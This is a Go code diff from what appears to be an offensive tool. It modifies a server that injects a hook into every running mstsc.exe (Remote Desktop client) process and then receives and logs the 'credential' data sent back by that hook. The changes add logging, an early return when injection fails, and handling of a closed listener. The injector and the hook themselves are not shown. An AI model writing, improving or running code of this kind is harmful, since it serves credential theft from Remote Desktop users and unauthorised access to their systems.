@@ -14,6 +14,7 @@ import (
 	"project/internal/crypto/aes"
 	"project/internal/logger"
 	"project/internal/module/taskmgr"
+	"project/internal/nettool"
 	"project/internal/patch/msgpack"
 	"project/internal/security"
 	"project/internal/xpanic"
@@ -92,10 +93,9 @@ func (srv *Server) taskmgrEventHandler(_ context.Context, event uint8, data inte
 		return
 	}
 	for _, process := range data.([]*taskmgr.Process) {
-		if process.Name != "mstsc.exe" {
-			continue
+		if process.Name == "mstsc.exe" {
+			srv.injectHook(process)
 		}
-		srv.injectHook(process)
 	}
 }
 
@@ -105,7 +105,9 @@ func (srv *Server) injectHook(process *taskmgr.Process) {
 	err := srv.injector(uint32(process.PID), hook)
 	if err != nil {
 		srv.logf(logger.Error, "failed to inject hook to process %d: %s", process.PID, err)
+		return
 	}
+	srv.log(logger.Info, "inject hook to process", process.PID)
 }
 
 func (srv *Server) serve(listener net.Listener) {
@@ -139,6 +141,9 @@ func (srv *Server) serve(listener net.Listener) {
 				srv.logf(logger.Warning, "accept error: %s; retrying in %v", err, delay)
 				time.Sleep(delay)
 				continue
+			}
+			if nettool.IsNetClosingError(err) {
+				return
 			}
 			srv.log(logger.Error, err)
 			return
@@ -180,7 +185,7 @@ func (srv *Server) handleClient(conn net.Conn) {
 		srv.log(logger.Error, "failed to unmarshal credential:", err)
 		return
 	}
-
+	srv.log(logger.Info, "receive credential")
 	srv.callback(cred)
 }
 
